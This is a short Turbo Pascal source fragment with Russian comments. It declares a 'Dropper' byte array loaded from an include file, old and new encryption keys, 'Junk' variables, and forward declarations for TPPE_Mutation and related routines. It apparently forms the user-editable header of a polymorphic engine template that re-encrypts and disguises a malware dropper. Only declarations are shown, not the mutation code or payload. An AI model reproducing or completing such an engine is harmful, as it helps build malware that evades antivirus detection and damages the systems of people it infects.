{$M 10000, 5000, 10000}
{** Измените данные константы **}
{*}const MaxInc=10;           {*}
{*}      Use = 'uses dos;';   {*}
{*******************************}
const Dr:array [1..ComLen] of byte = {$I tppes.inc};
      OldKey:array [1..40] of byte = ({$I tppek.inc});
var Command,Compile:string;
    Dummy:{$IFOPT T+}byte{$ELSE}{$IFOPT N+}integer{$ELSE}longint{$ENDIF}{$ENDIF};
    DetectComp,Fake:boolean;
    NewKey :array [1..40] of byte;
    Dropper:array [1..ComLen] of byte;
    Direct :array [0..17] of char;
    Junk1  :string;
    Junk2  :{$IFOPT T+}byte{$ELSE}{$IFOPT N+}integer{$ELSE}longint{$ENDIF}{$ENDIF};
    Junk3  :boolean;
procedure TPPE_Init;forward;
procedure TPPE_Mutation;forward;
procedure TPPE_Close;forward;
procedure TPPE_1;forward;
procedure TPPE_2;forward;
procedure TPPE_3;forward;
procedure TPPE_4;forward;
procedure TPPE_5;forward;
procedure TPPE_6;forward;
{*** Пользовательские Var, Const, Label, Forward: ***}
{*}procedure Starting;forward;                     {*}
{****************************************************}